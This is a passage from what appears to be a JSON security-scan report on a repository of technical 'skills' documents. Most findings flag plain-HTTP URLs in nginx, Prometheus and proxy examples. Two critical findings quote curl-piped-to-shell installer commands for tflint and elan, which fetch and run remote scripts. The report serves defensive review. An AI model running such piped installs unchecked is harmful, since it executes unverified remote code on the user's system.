        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 208,
        "issue": "Unencrypted HTTP",
        "evidence": "watch 'curl -s http://api.example.com:9090/metrics | grep connection_pool_active'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 237,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | grep connection_pool",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 453,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api:9090/metrics | grep connection_pool",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/resources/feature-flags/REFERENCE.md",
        "line_number": 391,
        "issue": "Unencrypted HTTP",
        "evidence": "url=\"http://unleash.example.com\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 285,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -f http://$GREEN_IP/health || {",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 510,
        "issue": "Unencrypted HTTP",
        "evidence": "url: http://flagger-loadtester/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 514,
        "issue": "Unencrypted HTTP",
        "evidence": "cmd: \"hey -z 1m -q 10 -c 2 http://myapp-canary/\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 527,
        "issue": "Unencrypted HTTP",
        "evidence": "address: http://prometheus:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 993,
        "issue": "Unencrypted HTTP",
        "evidence": "url: \"http://lb.example.com/api/pool/remove\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1029,
        "issue": "Unencrypted HTTP",
        "evidence": "url: \"http://{{ inventory_hostname }}:8080/health\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1038,
        "issue": "Unencrypted HTTP",
        "evidence": "url: \"http://lb.example.com/api/pool/add\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1579,
        "issue": "Unencrypted HTTP",
        "evidence": "ERROR_RATE=$(curl -s \"http://prometheus:9090/api/v1/query\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1767,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://app;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 2092,
        "issue": "Unencrypted HTTP",
        "evidence": "address: http://prometheus:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 302,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://prometheus:9090/api/v1/query?query=http_requests_total\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1562,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://alertmanager:9093/api/v1/alerts\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1584,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST http://pushgateway:9091/metrics/job/test -d '",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1592,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://alertmanager:9093/api/v1/alerts | jq '.data[] | select(.labels.alertname==\"TestAlert\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1744,
        "issue": "Unencrypted HTTP",
        "evidence": "curl 'http://prometheus:9090/api/v1/query?query=my_metric'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1747,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://prometheus:9090/api/v1/rules | jq '.data.groups[].rules[] | select(.name==\"MyAlert\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1750,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://prometheus:9090/api/v1/alerts | jq '.data.alerts[] | select(.labels.alertname==\"MyAlert\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1753,
        "issue": "Unencrypted HTTP",
        "evidence": "promtool query instant http://prometheus:9090 'my_metric > 100'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1769,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://prometheus:9090/api/v1/targets | jq '.data.activeTargets[] | select(.job==\"alertmanager\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1787,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://alertmanager:9093/api/v1/alerts",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1790,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://alertmanager:9093/metrics | grep notification",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/template.md",
        "line_number": 70,
        "issue": "Unencrypted HTTP",
        "evidence": "curl 'http://prometheus:9090/api/v1/query?query=[METRIC_NAME]'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/infrastructure/kubernetes-basics.md",
        "line_number": 230,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend:8080;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2255,
        "issue": "Pipe curl to shell",
        "evidence": "curl -s https://raw.githubusercontent.com/terraform-linters/tflint/master/install_linux.sh | bash",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2374,
        "issue": "Unencrypted HTTP",
        "evidence": "fmt.Sprintf(\"http://%s\", albDNS),",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/REFERENCE.md",
        "line_number": 1016,
        "issue": "Unencrypted HTTP",
        "evidence": "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft.md",
        "line_number": 319,
        "issue": "Unencrypted HTTP",
        "evidence": "etcd --name node1 --initial-cluster node1=http://10.0.1.1:2380,node2=http://10.0.1.2:2380,node3=http://10.0.1.3:2380",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/REFERENCE.md",
        "line_number": 763,
        "issue": "Unencrypted HTTP",
        "evidence": "- RAFT consensus visualization: http://thesecretlivesofdata.com/raft/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/formal/lean-proof-basics.md",
        "line_number": 71,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://raw.githubusercontent.com/leanprover/elan/master/elan-init.sh -sSf | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/smt-theory-applications.md",
        "line_number": 792,
        "issue": "Unencrypted HTTP",
        "evidence": "- SMT-LIB: http://smtlib.cs.uiowa.edu/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/z3-solver-basics.md",
        "line_number": 680,
        "issue": "Unencrypted HTTP",
        "evidence": "- SMT-LIB Standard: http://smtlib.cs.uiowa.edu/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/sat-solving-strategies.md",
        "line_number": 776,
        "issue": "Unencrypted HTTP",
        "evidence": "- MiniSat: http://minisat.se/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/sat-solving-strategies.md",
        "line_number": 778,
        "issue": "Unencrypted HTTP",
        "evidence": "- SAT Competition: http://www.satcompetition.org/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/cache-control.md",
        "line_number": 172,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 296,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app1:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 297,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app2:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 298,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app3:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 308,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app1:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 309,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app2:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 310,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app3:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 324,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app1:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/traefik-configuration.md",
        "line_number": 325,
        "issue": "Unencrypted HTTP",
        "evidence": "- url: \"http://app2:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 72,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 112,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 174,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 203,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 253,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 274,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 280,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 479,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://app_backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 500,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://app_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 538,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 544,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 550,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 574,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 583,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 606,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration.md",
        "line_number": 641,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://backend1.internal:8080/health",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 102,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 134,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 173,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://api_backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 178,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://admin_backend/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 185,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://web_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 267,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://backend1:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 268,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://backend2:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 269,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://backend3:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 490,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 506,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 527,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 546,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 561,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/reverse-proxy.md",
        "line_number": 608,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 100,
        "issue": "Unencrypted HTTP",
        "evidence": "'http://api.example.com/data',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 102,
        "issue": "Unencrypted HTTP",
        "evidence": "'http': 'http://user:pass@proxy.corp.com:8080',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 103,
        "issue": "Unencrypted HTTP",
        "evidence": "'https': 'http://user:pass@proxy.corp.com:8080'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 114,
        "issue": "Unencrypted HTTP",
        "evidence": "'http': f'http://{os.environ[\"PROXY_HOST\"]}:{os.environ[\"PROXY_PORT\"]}',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 115,
        "issue": "Unencrypted HTTP",
        "evidence": "'https': f'http://{os.environ[\"PROXY_HOST\"]}:{os.environ[\"PROXY_PORT\"]}'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 121,
        "issue": "Unencrypted HTTP",
        "evidence": "'http://api.example.com/data',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 145,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get('http://api.example.com/data', proxies=proxies)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 158,
        "issue": "Unencrypted HTTP",
        "evidence": "response = requests.get('http://api.example.com/data', proxies=proxies)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 412,
        "issue": "Unencrypted HTTP",
        "evidence": "export http_proxy=\"http://proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 413,
        "issue": "Unencrypted HTTP",
        "evidence": "export https_proxy=\"http://proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 417,
        "issue": "Unencrypted HTTP",
        "evidence": "export http_proxy=\"http://user:pass@proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 418,
        "issue": "Unencrypted HTTP",
        "evidence": "export https_proxy=\"http://user:pass@proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 428,
        "issue": "Unencrypted HTTP",
        "evidence": "git config --global http.proxy http://proxy.example.com:8080",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 429,
        "issue": "Unencrypted HTTP",
        "evidence": "git config --global https.proxy http://proxy.example.com:8080",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 447,
        "issue": "Unencrypted HTTP",
        "evidence": "\"httpProxy\": \"http://proxy.example.com:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 448,
        "issue": "Unencrypted HTTP",
        "evidence": "\"httpsProxy\": \"http://proxy.example.com:8080\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 510,
        "issue": "Unencrypted HTTP",
        "evidence": "'http://httpbin.org/ip',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 518,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy = \"http://proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 546,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy = f\"http://{quote(username)}:{quote(password)}@proxy.example.com:8080\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 563,
        "issue": "Unencrypted HTTP",
        "evidence": "proxies={'https': 'http://proxy.example.com:8080'},",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 584,
        "issue": "Unencrypted HTTP",
        "evidence": "session.mount('http://', adapter)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 588,
        "issue": "Unencrypted HTTP",
        "evidence": "'http': 'http://proxy.example.com:8080',",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 589,
        "issue": "Unencrypted HTTP",
        "evidence": "'https': 'http://proxy.example.com:8080'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nats-messaging.md",
        "line_number": 64,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-b/webhook', json=event)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nats-messaging.md",
        "line_number": 65,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-c/webhook', json=event)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nats-messaging.md",
        "line_number": 66,
        "issue": "Unencrypted HTTP",
        "evidence": "requests.post('http://service-d/webhook', json=event)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 718,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 838,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://api_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 852,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 887,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 908,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_v1;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 913,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_v2;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 917,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_default;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 941,
